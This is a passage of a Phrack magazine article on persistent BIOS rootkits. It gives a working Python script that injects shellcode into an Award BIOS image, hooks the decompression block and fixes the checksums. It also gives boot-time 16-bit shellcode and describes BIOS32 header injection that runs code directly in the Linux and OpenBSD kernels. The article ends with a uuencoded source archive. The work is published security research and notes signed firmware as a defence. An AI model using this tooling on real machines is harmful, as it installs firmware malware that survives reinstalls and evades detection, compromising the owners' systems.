+Our initial attempts were unsuccessful and produced mostly unbootable
+systems. Basically we ignored how many checksums the bios had, and you
+must patch everyone of them or face the terrifying "BIOS CHECKSUM
+ERROR" black screen of death.  The black screen of death got us
+thinking, it says "CHECKSUM" so, it must be some kind of addition
+compared to a number. And this kind of checks can be easily bypassed,
+injecting a number at some point that will *compensate* the addition.
+Isn't this the reason why CRC was invented after all?  It turns out
+that all the checksums were only 8-bits, and by touching only one byte
+at the end of the shellcode, all the checksums were compensated.  You
+can find the very simple algorithm to do this on the attachments,
+inside this python script:
+
+
+	-------------------------------------------------------------
+	modifBios.py
+
+	#!/usr/bin/python
+	import os,sys,math
+
+	# Usage
+	if len(sys.argv)<3:
+        	print "Modify and recalculate Award BIOS checksum"
+	        print "Usage: %s <original bios> <assembly shellcode 
+		file>" % (sys.argv[0])
+        	exit(0)
+
+	# assembly the file
+	scasm = sys.argv[2]
+	sccom = "%s.bin" % scasm
+	os.system("nasm %s -o %s " % (scasm,sccom) )
+	shellcode = open(sccom,'rb').read()
+	shellcode = shellcode[0xb55:] # skip the NOPs
+	os.unlink(sccom)
+	print ("Shellcode lenght: %d" % len(shellcode))
+
+	# Make a copy of the original BIOS
+	modifname = "%s.modif" % sys.argv[1]
+	origname = sys.argv[1]
+	os.system("cp %s %s" % (origname,modifname) )
+
+	#merge shellcode with original flash
+	insertposition = 0x3af75
+	modif = open(modifname,'rb').read()
+	os.unlink(modifname)
+	newbios=modif[:insertposition]
+	newbios+=shellcode
+	newbios+=modif[insertposition+len(shellcode):]
+	modif=newbios
+	#insert hook
+	hookposition = 0x3a41d
+	hook="\xe9\x55\x0b" # here is our hook,
+			    # at the end of the bootblock
+	newbios=modif[:hookposition]
+	newbios+=hook
+	newbios+=modif[hookposition+len(hook):]
+	modif=newbios
+
+	#read original flash
+	orig  = open(sys.argv[1],'rb').read()
+	
+	# calculate original and modified checksum
+	# Sorry, this script is not *that* generic
+	# you will have to harvest these values
+	# manually, but you can craft an automatic
+	# one using pattern search. 
+	# These offsets are for the Asus A7V8X-MX
+	# Revision 1007-001
+	
+	start_of_decomp_blk=0x3a400
+	start_of_compensation=0x3affc
+	end_of_decomp_blk=0x3b000
+	
+	ochksum=0 # original checksum
+	mchksum=0 # modified checksum
+	
+	for i in range(start_of_decomp_blk,start_of_compensation):
+		ochksum+=ord(orig[i])
+		mchksum+=ord(modif[i])
+	print "Checksums: Original= %08X Modified= %08X" % (ochksum,mchksum)
+	
+	# calculate difference
+
+	chkdiff = (mchksum & 0xff) - (ochksum & 0xff)
+
+	print "Diff : %08X" % chkdiff
+	
+	# balance the checksum
+	newbios=modif[:start_of_compensation]
+	newbios+=chr( (0x1FF-chkdiff) & 0xff )
+	newbios+=modif[start_of_compensation+1:]
+	
+	mchksum=0 # modified checksum
+	ochksum=0 # modified checksum
+	for i in range(start_of_decomp_blk,end_of_decomp_blk):
+		ochksum+=ord(orig[i])
+		mchksum+=ord(newbios[i])
+	print "Checksum: Original = %08X Final= %08X" % (ochksum,mchksum)
+	print "(Please check the last digit, must be the same in both checkums)"
+	
+	
+	newbiosname=sys.argv[2]+".compensated"
+	w=open(newbiosname,'wb')
+	w.write(newbios)
+	w.close()
+	print "New bios saved as %s" % newbiosname
+	
+	-------------------------------------------------------------
+	
+With this technique we successfully changed one bit, then one byte, then
+multiple bytes on a uncompressed region of the BIOS. The first step was
+accomplished.
+
+---[3.2.2.1 - Inserting the Hook
+  
+The hook is in exactly the same place: the decompressor block.  We
+also jumped to the same place that in the VMWARE code injection: In
+the end of the decompressor block generally there is enough space to
+do a pretty decent first stage shellcode.  It's easy to find. Hint:
+look for "= Award Decompression Bios =" In Phoenix bios, is the block
+marked as "DECOMPCODE" (using phnxdeco or any other tool). It almost
+never changes. It works.
+
+There are a couple of steps that you must do to ensure that you are
+hooking correctly. Firstly, insert a basic hook that only jumps
+forward, and then returns. Then, modify it to cause an infinite loop.
+(we don't have a debugger so we must rely on these horrible
+techniques) If you can control when the computers boots correctly and
+when it just locks up, congratulations. Now you have your code
+stealthy executing from the BIOS.
+
+---[3.2.3 - Payload
+  
+So now, you have complete control of the BIOS. Then you unveil your
+elite 16-bit shellcoding skills and try to use the venerable INT 10h
+to print "I PWNED J00!" on the screen and then proceed to use INT 13h
+to write evil things to the hard disk.
+
+Not that fast. You will be greeted with the black screen of fail. 
+
+What happens is that you still don't have complete control of the
+BIOS.  First and foremost, as we did on the VMWARE hook, you are
+gaining execution multiple times during the boot process. The first
+time, the disk is not spinning, the screen is still turned off and
+most surprisingly, the Interruption Vector Table is not initialized.
+This sounds very cool but it is a big problem. You can't write to the
+disk if it's not spinning, and you can use an interrupt if the IVT is
+not initialized.
+
+You must wait. But how do you know when to execute? You again need some
+sort of ready-to-go signal.
+
+---[3.2.3.1 - The Ready Signal
+  
+In the VMWARE, we used the contents of the IVT as a ready signal. The
+shellcode tested if the IVT was ready simply by checking if it had the
+correct values. This was very easy because in real-mode, the IVT is
+always in the same place (0000:0000, easy to remember by the way).
+This technique basically sucks, because you really can't get less
+generic than this. The pointers on the IVT change all the time, even
+between versions of the same BIOS manufacturer.  We need a better,
+more "works-on-other-computers-apart-from-mine" technique.
+
+In short, this is the solution and it works great: 
+Check if C000:0000 contains the signature AA55h.
+
+If that conditions is true, then you can execute any interruption. The
+reason is that in this precise position the VGA BIOS is loaded on all
+PCs.  And AA55h is a signature that tell us that the VGA BIOS is
+present. It's fine to assume that if the VGA BIOS has been loaded,
+then the IVT has been initialized.  Warning: Surely the hard disk is
+not spinning yet! (It's slow) but now you can check for it with the
+now non-crashing interruption 13h, using function 41h to check for LBA
+extensions and then trying to do a disk reset, using function 00h. You
+can see an example of this on the shellcode of the section 3.1.5.1
+
+The rest is history. You can use int 13h with LBA to check for the
+disk, if it's ready, then you insert a disk-stage rootkit on it, or
+insert an SMBIOS rootkit (see [PHRACK65]), or bluepill, or the
+I-Love-You virus, or whatever rocks you. Your code is now immortal.
+		
+For the record, here is a second shellcode:
+
+	-------------------------------------------------------------
+	;skull.asm please use nasm to assemble
+	BITS 16
+	back:
+	        TIMES 0x0b55 db 0x90
+
+	begin2:
+	        pusha
+	        pushf
+		push es
+		push ds
+
+		push 0xc000
+	        pop ds
+		cmp word [0],0xaa55
+		je print
+	
+	volver:
+		pop ds
+		pop es
+	        popf
+	        popa
+	        pushad
+	        push cx
+	        jmp back
+	
+	print:
+	        jmp start
+	
+	        ;message
+	        ;   123456789
+	msg:    db ' .---.',13,10,\
+	           '/     \',13,10,\
+	           '|(\ /)|',13,10,\
+	           '(_ o _)',13,10,\
+	           ' |===|',13,10,\
+	           ' `-.-`',13,10
+	        times 55-$+msg db ' '
+	
+	start:
+	        ;geteip
+	        call getip
+	getip:
+	        pop dx
+	
+	        ;init video
+	        mov ax,0003
+	        int 0x10
+	
+	        ;video write
+	        mov bp,dx
+	        sub bp,58 ; message
+	
+	        ;write string
+	        mov ax,0x1300
+	        mov bx,0x0007
+	        mov cx,53
+	        mov dx,0x0400
+	        push cs
+	        pop es
+	        int 0x10
+	
+	        call sleep
+	        jmp volver
+	
+	sleep:
+	        mov cx, 0xfff
+	l1:
+	        push cx
+	        mov cx,0xffff
+	l2:
+	        loop l2
+	        pop cx
+	        loop l1
+	        ret
+	-------------------------------------------------------------
+
+
+------[ 4.- BIOS32 (Kernel direct infection)
+
+Now you have your bios rootkit executing in BIOS, but being in BIOS
+sucks from an attacker's point of view. You ideally want to be in the
+kernel of the Operative System. That is why you should do something
+like drop a shellcode to hard-disk or doing an SMBIOS-rootkit.  But
+what if the hard-disk is encrypted? Or if the machine really doesn't
+have a hard disk and boots from the network?
+
+Fear not, because this section is for you. There is the misconception
+that the BIOS is never used after boot, but this is untrue.  Operative
+Systems make BIOS calls for many reasons, like for example, setting
+video modes (Int 10h) and doing other funny things like BIOS-32 calls.
+
+What is BIOS32? using Google-based research we concluded that is an
+arcane BIOS service to provide information about other BIOS services
+to modern 32-bit OSes, in an attempt by BIOS vendors to stay relevant
+on the post MS-DOS era. You can refer to [BIOS32SDP] for more
+information.  What's important is that many OSes make calls to it, and
+the only requirement to being a BIOS32 service is that you must place
+a BIOS32 header somewhere in the E000:0000 to F000:FFFF memory region,
+16-byte aligned. The headers structure is:
+
+Offset	Bytes	Description
+0	4	Signature "_32_"
+4	4	Entry point for the BIOS32 Service (here you put a pointer
+		to your stuff)
+8	1	Revision level, put 0
+9	1	Length of the BIOS32 Headers in paragraphs (put 1)
+10	1	8-bit Checksum. Security FTW!
+11	5	Reserved, put 0s.
+
+This is a pattern on all BIOS services. The way to locate and execute
+services is a pattern search followed by a checksum, and then it just
+jumps to a function that is some kind of dispatcher.  This behavior is
+present in various BIOS functions like Plug and Play ($PnP), Post
+Memory Manager ($PMM), BIOS32 (_32_), etc.  Security was not
+considered at the time when this system was designed, so we can take
+advantage of this and insert our own headers (We can even use an
+option-rom from this, without modifying system BIOS), and the OS
+ultimately always trust the BIOS.
+
+You can see how Linux 2.6.27 detects and calls this service on the
+kernel function:
+
+arch/x86/pci/pcibios.c,check_pcibios()
+...
+	if ((pcibios_entry = bios32_service(PCI_SERVICE))) {
+		pci_indirect.address = pcibios_entry + PAGE_OFFSET;
+
+		local_irq_save(flags);
+		__asm__(
+			"lcall *(%%edi); cld\n\t"  <--- Pwn point
+			"jc 1f\n\t"
+			"xor %%ah, %%ah\n"
+			"1:"
+...
+
+OpenBSD 4.5 does the same here:
+
+sys/arch/i386/i386/bios.c,bios32_service()
+int
+bios32_service(u_int32_t service, bios32_entry_t e, bios32_entry_info_t ei)
+{
+...
+	base = 0;
+	__asm __volatile("lcall *(%4)"         <-- Pwn point
+	    : "+a" (service), "+b" (base), "=c" (count), "=d" (off)
+	    : "D" (&bios32_entry)
+	    : "%esi", "cc", "memory");
+...
+
+At the moment we don't have any data on Windows XP/Vista/7 
+BIOS32-direct-calling, but please refer to the presentation [JHeasman]
+where it documents direct Int 10h calling from several points on the
+Windows kernel.
+
+Faking a BIOS32 header or modifying an existing one is a viable way to
+do direct-to-kernel binary execution, and more comfortable than the
+int 10 calling (we don't need to jump to and from protected mode), 
+without having to rely on weird stuff like we explained on section 2
+and 3. 
+Unfortunately because of lack of time, we couldn't provide a BIOS32
+infection vector PoC in this issue, but it should be relatively easy
+to implement, you now have all the tools to do it safely inside a
+virtual machine, like VMware.
+
+------[ 5.- Future and other uses
+
+Bios modification is a powerful attack technique. As we said before,
+if you take control of the system at such an early stage, there is
+very little that an anti-virus or detection tool can do. Furthermore,
+we can stay resident using a common boot-sector rootkit, or file
+system modification.  But some of the more fun things that you can do
+with this attack is to drop a more sophisticated rootkit, like a
+virtualized one, or better, a SMM Rootkit.
+
+---[5.1 - SMM!
+  
+The difficulty of SMM Rootkits relies on the fact that you can't 
+touch the SMRAM once the system is booted, because the BIOS sets
+the D_LCK bit [PHRACK65].  Recently many techniques has been
+developed to overcome this lock, like [DUFLOTSM], but if you are
+executing in BIOS, this lock doesn't affect you, because you are
+executing before this protection, and you could modify the SMRAM
+directly on the firmware. However, this	technique would be very 
+difficult and not generic at all, but it's doable.
+
+---[5.2 - Signed firmware
+	
+The huge security hole that is allowing unsigned firmware into
+a motherboard is being slowly patched and many signed BIOS
+systems are being deployed, see [JHeasman2] for examples.
+This gives you an additional layer of security and prevent
+exactly the kind of attack proposed in this article.
+However, no system is completely secure, bug and backdoors
+will always exist. To this date no persistent attack on
+signed bios has been made public, but researchers are
+close to beating this kind of protections, see for example 
+[ILTXT].
+	
+---[5.3 - Last words
+	
+Few software is so fundamental and at the same time, so closed,
+as the BIOS. UEFI [UEFIORG], the new firmware interface, promises 
+open-standards and improved security.
+But meanwhile, we need more people looking, reversing and 
+understanding this crucial piece of software. 
+It has bugs, it can contain malicious code, and most importantly,
+BIOS can have complete control of your computer. Years ago people
+regained part of that control with the open-source revolution, but
+users won't have complete control until they know what's lurking
+behind closed-source firmware.
+If you want to improve or start researching your own BIOS and
+need more resources, an excellent place to start would be
+the WIM'S BIOS High-Tech Forum [WBHTF], where very low-level
+technical discussions take place.
+	
+
+--[6.- Greetz
+  
+We would like to thank all the people at Core Security for giving us
+the space and resources to work in this project, in particular to the
+whole CORE's Exploit writers team for supporting us during the time we
+spent researching this interesting stuff.
+	
+Kudos to the phrack editor team that put a huge effort into this 
+e-zine.
+
+To t0p0, for inspiring us in this project with his l33t cisco stuff.
+To Gera for his technical review.  To Lea & ^Dan^ for correctin our
+englis.  And Laura for supporting me (Alfred) on my long nights of
+bios-related suffering. 
+	
+	
+---[7.- References
+
+[JHeasman] Firmware Rootkits, The Threat to the Enterprise,
+	   John Heasman, http://www.ngssoftware.com/research/
+	   papers/BH-DC-07-Heasman.pdf
+[JHeasman2] Implementing and detecting ACPI BIOS rootkit,
+	    http://www.blackhat.com/presentations/bh-federal-06/
+	    BH-Fed-06-Heasman.pdf 
+[BIOS32SDP] Standard BIOS 32-bit Service Directory Proposal 0.4,
+	    Thomas C. Block, http://www.phoenix.com/NR/rdonlyres/
+            ECF22CEC-A1B2-4F38-A7F9-629B49E1DCAB/0/specsbios32sd.pdf
+[COREBOOT] Coreboot project, Flashrom utility, http://www.coreboot.org/
+	   Flashrom
+[PHRACK65] Phrack Magazine, Issue 65, http://www.phrack.com/
+	   issues.html?issue=65
+[DUFLOTSM] "Using CPU System Management Mode to Circumvent 
+	   Operating System Security Functions" Loic Duflot, 
+	   Daniel Etiemble, Olivier Grumelard Proceedings of 
+	   CanSecWest, 2006 
+[UEFIORG]  Unified EFI Forum, http://www.uefi.org/
+[ILTXT]	   Attacking Intel Trusted Execution Technology,
+	   BlackHat DC, Feb 2009. 
+	   http://invisiblethingslab.com/resources/
+	   bh09dc/Attacking%20Intel%20TXT%20-%20paper.pdf
+[WBHTF]    WIM'S BIOS In-depth High-tech BIOS section
+	   http://www.wimsbios.com/phpBB2/
+	   in-depth-high-tech-bios-section-vf37.html
+[LZH]      http://en.wikipedia.org/wiki/LHA_(file_format)
+[Pinczakko] Pinczakko Official Website, 
+            http://www.geocities.com/mamanzip/
+
+  ---[8.- Sources
+
+begin 644 phrack-66-07.tgz
+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
+*OP'CP.BZ`'@`````
+`
+end
+
+--------[ EOF
+
